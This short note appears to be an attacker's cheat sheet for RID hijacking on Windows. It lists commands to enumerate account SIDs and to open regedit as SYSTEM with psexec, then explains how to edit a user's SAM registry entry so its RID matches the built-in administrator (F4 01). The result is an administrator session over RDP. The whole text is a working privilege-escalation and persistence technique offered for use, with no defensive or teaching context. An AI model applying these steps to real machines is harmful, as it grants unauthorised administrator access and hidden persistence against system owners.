```cmd
wmic useraccount get name,sid
psexec64.exe -i -s regedit
```

HKLM\\SAM\\Domains\\Account\\Users

Numbers are in hex format and correspond to the SID above.
Change only the two hex values to match the admin hex values F4 01.  
Login via RDP and whoami shows administrator.  